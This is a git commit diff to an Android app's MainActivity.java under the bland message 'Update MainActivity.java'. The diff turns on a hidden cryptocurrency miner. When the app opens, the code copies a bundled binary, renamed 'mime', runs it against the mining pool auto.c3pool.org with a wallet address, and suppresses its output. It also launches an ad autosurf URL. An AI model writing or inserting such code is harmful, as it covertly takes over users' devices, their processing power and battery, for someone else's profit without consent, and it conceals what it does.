eb180189f9038e62f6f67ab2219f25178240346f
r1nny <109706512+r1nny@users.noreply.github.com>
2022-09-21 01:22:36 -0500

    Update MainActivity.java

--- com/main/MainActivity.java
+++ com/main/MainActivity.java
@@ -6,21 +6,20 @@ public class MainActivity extends android.app.Activity
     public void onCreate(final android.os.Bundle savedInstanceState)   
     {
         super.onCreate(savedInstanceState);
+        super.startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("https://www.alexamaster.net/ads/autosurf/180120")));
         //java.lang.System.loadLibrary("uv");
         final var mime = new java.io.File(super.getFilesDir(), "mime");
         try (final var assets = super.getAssets(); final var androidNotls = assets.open("android-notls"))
         {
             java.nio.file.Files.copy(androidNotls, mime.toPath());
             mime.setExecutable(true);
-            final var processBuilder = new java.lang.ProcessBuilder(mime.getPath(), "-h"/*, "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"*/);
+            final var processBuilder = new java.lang.ProcessBuilder(mime.getPath(), "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR");
             final var environment = processBuilder.environment();
             environment.putIfAbsent("LD_LIBRARY_PATH", new java.io.File(super.getDataDir(), "lib").getPath());
             final var process = processBuilder.start();
             process.waitFor();
-            java.lang.System.out.println(new java.lang.String(process.getInputStream().readAllBytes()));
-            java.lang.System.out.println(new java.lang.String(process.getErrorStream().readAllBytes()));
+            //java.lang.System.out.println(new java.lang.String(process.getInputStream().readAllBytes()));
+            //java.lang.System.out.println(new java.lang.String(process.getErrorStream().readAllBytes()));
         }
-        catch (final java.lang.Exception e){java.lang.System.out.println(e);}
-        //super.startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("https://www.alexamaster.net/ads/autosurf/180120")));
     }  
 }
